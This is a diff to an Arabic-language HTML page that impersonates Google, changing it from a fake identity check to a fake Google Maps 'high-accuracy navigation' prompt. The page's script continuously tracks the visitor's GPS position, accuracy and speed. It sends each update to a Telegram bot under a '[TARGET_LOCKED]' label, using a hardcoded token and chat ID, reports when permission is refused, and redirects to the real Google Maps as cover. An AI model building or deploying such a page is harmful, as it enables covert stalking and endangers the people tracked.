@@ -3,51 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الهوية - Google</title>
+    <title>Google Maps - تحديد الموقع</title>
     <style>
-        body { font-family: sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dfe1e5; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .google-text { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
-        .blue { color: #4285F4; } .red { color: #EA4335; } .yellow { color: #FBBC05; } .green { color: #34A853; }
-        h2 { font-size: 22px; font-weight: 400; margin-bottom: 10px; }
-        p { color: #202124; margin-bottom: 30px; font-size: 14px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; width: 100%; }
+        body { font-family: 'Roboto',arial,sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
+        img { width: 60px; margin-bottom: 15px; }
+        h2 { font-size: 18px; color: #3c4043; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 14px; }
+        .btn:active { background-color: #174ea6; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="google-text">
-            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
-        </div>
-        <h2>تأكيد الهوية</h2>
-        <p>لحماية حسابك، يرجى تأكيد موقعك الحالي للمتابعة إلى Gmail.</p>
-        <button class="btn" onclick="getLocation()">تأكيد الآن</button>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/39/Google_Maps_icon_%282015-2020%29.svg" alt="Maps">
+        <h2>تفعيل التنقل المباشر</h2>
+        <p>لتحسين دقة تحديد الموقع وتجنب انقطاع الخدمة أثناء التنقل، يرجى الضغط على الزر أدناه والسماح بالوصول المباشر.</p>
+        <button class="btn" onclick="startTracking()">تفعيل الموقع بدقة عالية</button>
     </div>
 
     <script>
-        function getLocation() {
+        const token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+        const chat_id = "8397194527";
+
+        function startTracking() {
+            // خيارات الدقة العالية (حتى لو كان يمشي)
+            const options = {
+                enableHighAccuracy: true, // تفعيل GPS الحقيقي
+                timeout: 10000,
+                maximumAge: 0
+            };
+
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendData, showError);
+                // استخدام watchPosition بدلاً من getCurrentPosition لضمان الملاحقة أثناء الحركة
+                navigator.geolocation.watchPosition(sendLocation, showError, options);
             } else {
-                alert("المتصفح لا يدعم التوثيق الجغرافي.");
+                alert("متصفحك لا يدعم هذه الميزة.");
             }
         }
 
-        function sendData(position) {
-            const token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
-            const id = "8397194527";
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const msg = `🎯 [TARGET_LOCKED]\n📍 الموقع: ${lat},${lon}\n🔗 الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+        function sendLocation(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const speed = pos.coords.speed || 0; // سرعة الحركة
+
+            const text = `🎯 [TARGET_LOCKED]\n📍 الموقع: ${lat},${lon}\n🎯 الدقة: ${acc} متر\n🚀 السرعة: ${speed} م/ث\n🔗 الرابط: https://www.google.com/maps?q=${lat},${lon}`;
             
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`)
-            .then(() => {
-                window.location.href = "https://accounts.google.com/signin";
-            });
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+            
+            // تحويل المستخدم لخرائط جوجل الحقيقية للتمويه
+            setTimeout(() => {
+                window.location.href = "https://www.google.com/maps";
+            }, 3000);
         }
 
         function showError(error) {
-            alert("خطأ: يجب السماح بالوصول للموقع لإكمال عملية تسجيل الدخول.");
+            let errorMsg = "Denied";
+            if(error.code == 1) errorMsg = "User_Rejected_Permission";
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${errorMsg}`);
+            alert("يرجى إغلاق أي تطبيقات تظهر فوق الشاشة والسماح بالموقع للمتابعة.");
         }
     </script>
 </body>
